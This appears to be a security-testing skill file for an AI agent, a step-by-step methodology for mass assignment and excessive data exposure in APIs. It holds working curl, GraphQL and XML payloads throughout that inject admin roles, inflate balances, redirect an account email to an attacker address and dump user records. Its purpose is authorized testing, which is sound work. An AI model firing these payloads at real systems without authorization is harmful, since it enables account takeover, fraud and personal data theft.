---
name: mass-assignment
description: Detect and exploit mass assignment and excessive data exposure in APIs and web applications
origin: AI Threat Hunting
---

# Mass Assignment Testing

> **Kali MCP audit header:** use `X-Technique: AUTH` (mass assignment is authorization bypass via client-controlled fields — the attacker escalates privileges by injecting `is_admin`, `role`, or `permissions` into the request body). Set `X-Destructive: 1` whenever the forged request creates, modifies, or deletes a resource.

## When to Activate

- API accepts JSON or form-encoded bodies for create/update operations
- Testing for unauthorized field binding, privilege escalation via extra parameters, or excessive data exposure
- User registration, profile update, or resource creation endpoints

## Tools

- `curl` (manual parameter injection and response analysis)
- `Arjun` / `param-miner` (hidden parameter discovery and fuzzing)
- Browser DevTools (compare request fields vs response fields)

## Methodology

### 1. Response Field Enumeration
- [ ] Send a GET request and record all fields in the response
```bash
curl -s https://target/api/user/profile | jq .
```
- [ ] Compare response fields against API documentation — flag extra fields returned
- [ ] Look for internal fields: `id`, `uuid`, `created_at`, `updated_at`, `role`, `is_admin`, `is_staff`, `permissions`, `balance`, `credits`, `internal_id`, `password_hash`
- [ ] Check if PII fields are exposed: `email`, `phone`, `ssn`, `address`, `dob`

### 2. Privilege Escalation via Extra Fields
- [ ] Add privileged fields to POST/PUT/PATCH requests
```bash
# Registration with role injection
curl -X POST https://target/api/register -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin"}'

# Profile update with privilege escalation
curl -X PUT https://target/api/user/profile -H "Content-Type: application/json" \
  -d '{"name":"test","isAdmin":true,"is_staff":true,"role":"administrator"}'

# Balance/credits manipulation
curl -X PATCH https://target/api/user/profile -H "Content-Type: application/json" \
  -d '{"balance":999999,"credits":999999,"verified":true}'
```
- [ ] Test common privilege fields
```
role, admin, isAdmin, is_admin, is_staff, verified, email_verified,
active, approved, permissions, group, level, type, plan, tier,
balance, credits, discount, price, amount
```

### 3. PATCH Request Field Injection
- [ ] Test if PATCH accepts fields not intended for update
```bash
curl -X PATCH https://target/api/users/123 -H "Content-Type: application/json" \
  -d '{"id":456}'

curl -X PATCH https://target/api/users/123 -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.example","email_verified":true}'
```
- [ ] Test field overwrite on related objects (nested assignment)
```json
{"profile": {"role": "admin"}, "organization": {"owner_id": 123}}
```

### 4. Content-Type Mutation Testing
- [ ] Test same endpoint with different Content-Types
```bash
# JSON
curl -X POST https://target/api/update -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'

# Form-encoded
curl -X POST https://target/api/update \
  -d "name=test&role=admin"

# XML
curl -X POST https://target/api/update -H "Content-Type: application/xml" \
  -d '<user><name>test</name><role>admin</role></user>'
```
- [ ] Some frameworks parse multiple Content-Types with different binding rules

### 5. GraphQL Mutation Injection
- [ ] Add extra fields to mutation variables
```graphql
mutation {
  updateUser(input: {name: "test", role: "ADMIN", isVerified: true}) {
    id name role
  }
}
```
- [ ] Use introspection to discover all input fields on mutation types
- [ ] Test if undocumented fields are accepted by the resolver

### 6. Hidden Parameter Discovery
- [ ] Use parameter name fuzzing tools
```bash
arjun -u https://target/api/register -m POST --json
```
- [ ] Fuzz based on response fields — send each GET response field back in POST
- [ ] Check framework debug endpoints for model/schema definitions

### 7. Bulk Endpoint Data Leakage
- [ ] Test list/search endpoints for data belonging to other users
```bash
curl https://target/api/users
curl https://target/api/users?limit=1000
curl https://target/api/admin/users
```
- [ ] Check if filtering reveals unauthorized records
```bash
curl "https://target/api/orders?user_id=other_user_id"
```

### 8. Framework-Specific Testing
- [ ] **Rails**: check for `params.permit` allowlisting — test fields outside the permit list
- [ ] **Django**: test serializer field restrictions — `fields` vs `exclude` in ModelSerializer
- [ ] **Express**: test body-parser output going directly to Mongoose/Sequelize update
- [ ] **Spring**: test `@ModelAttribute` binding — all request params bound to object fields

## What to Record

- Endpoint, HTTP method, and Content-Type where assignment succeeds
- Exact field names that were injected and accepted
- Before/after state showing the unauthorized change (GET before, POST with extra field, GET after)
- Impact: privilege escalation, balance manipulation, PII access, data leakage
- Full request/response for reproducibility

## Extended Resources

- `agent/references/api-security/API03-broken-property-authz.md` — OWASP API Security Top 10:2023 excessive data exposure / mass assignment
